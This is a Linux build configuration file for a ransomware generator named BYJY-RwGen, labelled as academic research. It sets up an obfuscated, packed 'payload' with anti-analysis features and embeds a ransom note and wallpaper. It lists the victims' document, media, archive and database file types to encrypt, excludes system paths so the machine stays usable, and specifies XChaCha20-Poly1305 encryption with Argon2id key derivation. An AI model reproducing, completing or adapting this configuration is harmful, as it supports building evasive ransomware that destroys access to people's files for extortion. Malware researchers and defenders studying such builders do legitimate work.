# Linux Build Configuration for BYJY-RwGen
# Academic Research Configuration

# Source and output directories
SRC_DIR="src"
OUT_DIR="dist"
MAIN_EXECUTABLE="payload"

# Target architecture: x86_64, i686, arm, aarch64
TARGET_ARCH="x86_64"

# Obfuscation level: low, medium, high
OBFUSCATION_LEVEL="high"

# Enable anti-analysis techniques
ENABLE_ANTI_ANALYSIS=1

# Pack the final executable
PACK_EXECUTABLE=1

# Resources to embed
RESOURCES=("ransom_note.txt" "config.json" "wallpaper.bmp")

# Compiler flags
CFLAGS="-O3 -fno-stack-protector -fno-unwind-tables -fno-asynchronous-unwind-tables"
LDFLAGS="-s -Wl,--gc-sections -Wl,-z,relro,-z,now -static"

# Obfuscation flags (if OLLVM available)
OLLVM_FLAGS="-mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf"

# Post-build commands
POST_BUILD_COMMANDS=(
    "echo 'Linux build completed'"
    "ls -la dist/"
    "file dist/payload"
)

# Target file extensions
TARGET_EXTENSIONS=(
    ".txt" ".doc" ".docx" ".pdf" ".odt"
    ".xls" ".xlsx" ".ods" ".csv"
    ".jpg" ".jpeg" ".png" ".gif" ".bmp"
    ".mp3" ".mp4" ".avi" ".mkv" ".mov"
    ".zip" ".tar" ".gz" ".bz2" ".xz"
    ".sql" ".db" ".sqlite"
)

# Excluded system paths
EXCLUDED_PATHS=(
    "/bin" "/sbin" "/usr/bin" "/usr/sbin"
    "/boot" "/dev" "/proc" "/sys"
    "/run" "/tmp" "/var/log"
)

# Encryption settings
ENCRYPTION_ALGO="xchacha20poly1305"
KEY_DERIVATION="argon2id"
KDF_ITERATIONS=10
KDF_MEMORY=65536
KDF_PARALLELISM=4